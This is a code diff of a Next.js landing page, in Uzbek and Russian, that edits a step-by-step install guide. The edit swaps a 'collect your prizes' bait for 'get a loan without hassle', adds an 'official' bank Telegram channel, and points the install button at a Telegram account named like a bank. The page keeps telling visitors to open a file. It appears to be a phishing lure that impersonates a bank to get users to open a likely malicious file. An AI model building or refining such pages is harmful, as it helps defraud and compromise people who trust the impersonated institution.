@@ -22,22 +22,22 @@ export default function Home() {
           </li>
           <li className={css.step}>
             {lang.value === "uz"
-              ? `Telegram botiga “/start” ni yuboring`
-              : "Отправьте /start в телеграм бот"}
+              ? `Rasmiy Telegram kanaliga o'ting`
+              : "Перейдите в официальный телеграм канал"}
           </li>
           <li className={css.step}>
             {lang.value === "uz" ? `Faylni oching` : "Откройте файл"}
           </li>
           <li className={css.step}>
             {lang.value === "uz"
-              ? `Sovrin va sovg'alaringizni yig'ing!`
-              : "Заберите свои призы и подарки!"}
+              ? `Hech qanday muammosiz kredit oling!`
+              : "Получите кредит без лишних хлопот!"}
           </li>
         </ol>
 
         <div className={css.installSection}>
           <Link
-            href={"tg://resolve?domain=CardXabarIlovaBot"}
+            href={"tg://resolve?domain=MyTuronBankRasmiy"}
             className={css.installButton}
           >
             {lang.value === "uz"
